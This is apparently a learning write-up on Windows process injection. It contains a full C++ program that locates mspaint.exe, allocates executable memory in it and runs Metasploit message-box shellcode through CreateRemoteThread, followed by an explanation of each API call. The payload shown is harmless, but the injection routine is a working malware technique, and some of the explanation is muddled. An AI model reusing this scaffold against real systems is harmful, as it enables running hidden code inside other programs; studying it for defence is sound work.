# Code:

```cpp
#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(int argc, char** argv) {
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
		"\x8b\x52\x18\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72"
		"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
		"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
		"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
		"\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b"
		"\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
		"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
		"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
		"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
		"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
		"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
		"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
		"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0e"
		"\x00\x00\x00\x4e\x6f\x20\x73\x65\x61\x73\x20\x50\x65\x72"
		"\x72\x6f\x00\x5a\xe8\x12\x00\x00\x00\x50\x72\x6f\x63\x65"
		"\x73\x73\x2d\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00\x41"
		"\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31"
		"\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5";

	// Int PROCESSENTRY32 struct
	PROCESSENTRY32 pe32;
	//Set the size member to the whole size of the struc
	pe32.dwSize = sizeof(PROCESSENTRY32);
	// Take a snapshot of all running process
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	// Get the first process of all running process
	Process32First(snapshot, &pe32);

	// Loop thorugh the whole snapshot until 'mspaint.exe' is found
	do {
		// Check if we have match for mspaint.exe
		if (wcscmp(pe32.szExeFile, L"mspaint.exe") == 0) {
			// Obtain a handle to 'mspaint.exe'
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			//Allocate memory in mspaint.exe
			LPVOID allocate_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

			if (allocate_mem == NULL) {
				printf("Memory allocated failed: %ul\n", GetLastError());

				return 1;
			}

			printf("Memory page allocated at: 0x%p\n", allocate_mem);

			// Write shellcode to the allocated memory in mspaint.exe
			WriteProcessMemory(hProcess, allocate_mem, shellcode, sizeof(shellcode), NULL);
			// Create a thread to execute shellcode
			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocate_mem, NULL, 0, NULL);

			if (hThread == NULL) {
				printf("Failed to obtain the handle to process: %ul\n", GetLastError());

				return 1;
			}

			// Halr execution until thread returns
			WaitForSingleObject(hThread, INFINITE);

			// Free allocate memory in mspaint.exe
			VirtualFreeEx(hProcess, allocate_mem, 0, MEM_RELEASE);

			// CLose the handle to the create thread
			CloseHandle(hThread);

			// Close the handle to mspaint.exe process

			CloseHandle(hProcess);

			break;

		}

		// Enumerate the snapshot

	} while (Process32Next(snapshot, &pe32));

	return 0;
}
```

# Explanation:
First at all is so similar to self_injection code but with some modifications. First at all we must to generate the shellcode with msfconsole.
`msf6 payload(windows/x64/messagebox) > generate`, and get the shellode.

In the process injection the difference is the shellcode will injectern into the memory of another running procces. In this case we will inject in the
microsoft paint programe. We use 64-bit process program that the reason the shell code is 64 bits.
In this programe we must to add other procces in that.
1. Get the handle to the process
2. Allocate Memory
3. Write shellcode
4. Execute the shell code.

- Now in Order to ger the handl to the proccess id that we want to inject u will use open process api [OpenProcess];
    - This API takes in three parameters:
        1. PROCESS_ALL_ACCESS: Is a constant uses on Windows to request the posible acces rights to proccess obj. Since we want access to all process resources we use it this flag.
        2. FALSE: This process takes the Boolean value and we set it TRUE of we want make the child proccess inhiter this handle but we wont created then is FALSE.
        3. pe32.th32ProcessID: The most important parameter, is the proccess id which want to access, this processor can obtained by opening a tool like process. Instead copy the PID of the paint
           we must to take the snapshot of the processor, and then we loop through each process and cheack its name.
           In this we define the PROCESSENTRY32 struc which will store information realted to each process in the.
           Then we size the memory [pe32.dwSize = sizeof(PROCESSENTRY32);] of the hole structure.
        4. We have the CreateToolhelp32Snapshot api whic takes in two parameters;
            1. TH32CS_SNAPPROCESS; This parameter is the portion of the system to be included in the snapshot. This include the system in the snapshot. Enumerate the process see [Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first).
            2. The second Parameter is 0; The second parameter supplied any of this things [TH32CS_SNAPHEAPLIST. TH32CS_SNAPPMODULE, TH32CS_SNAPPMODULE32].
               For theat u need to include the tlhelp32 library.
        5. Process32First and Process32Next is complementaries and thous has 2 paramerts:
            1. snapshot.
            2. Pointer &pe32
            In this funtions Compere the  Process32Next with the executable name [.szExeFile] with the namee mspaint.exr or microsoft paint.
            The funtion wcscmp compares two string togheder and if they match, the returns value is 0.
            Windows use the UTF-16 use this to encode and decode. In this case we see:
            [M.S.P.A.I.N.T...E.X.E != MSPAINT.EXE] We use the prefix [L"mspaint"] to tell the compiler to convert this normal string to a wide string before doing the comprasion.
        6. Use VirtualAllocEx; cause externd the funtionality of VirtualAlloc so the can allocate the memory inside the memory spaces of other processes.
           The diff the first parameter is the handle to the process in which we want to allocate the memory [hProcess]. After the memory is allocated, we use the:
        7. [WriteProcessMemory] api to write our shellcode in the allocated memory inside the microsoft paint process. This api takes in five Patameter:
            1. WriteProcessMemory: Handle to microsoft paint process a source copy or read form. [hProcess].
            2. allocate_mem : The destination to write to.
            3. shellcode: Source copy or read from a destination to.
            4. sizeof(shellcode): size of the copied data and the numbers of a bytes read.
            5. NULL: numbers of a bytes  read is not important then put null.
        8. Fially we create the [CreateRemoteThread] api which takes in same parameter as [createThread] to handle to the microsoft paint process[hProcess].
        9. Similar to self_injection we [WaitForSingleObject].
        10. Then we free the allocated memory in [VirtualFreeEx()].
        11. Close the handle [CloseHandle(hThread)] to the thread and to the process [CloseHandle(hProcess)].


